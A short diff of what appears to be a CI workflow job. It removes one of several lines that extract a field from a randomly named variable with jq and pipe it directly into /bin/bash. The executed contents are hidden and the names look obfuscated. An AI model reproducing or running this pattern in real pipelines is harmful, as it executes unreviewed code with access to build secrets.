@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$oo959" | jq -r .bynb1167 | /bin/bash
           echo $u28073 | jq -r .h3441 | /bin/bash
           echo $ekyv90813 | jq -r .v620 | /bin/bash
-          printf '%s' "$bgzz2" | jq -r .agp1 | /bin/bash
           echo $hboi81 | jq -r .uyj46641 | /bin/bash
 
       - name: Upload results
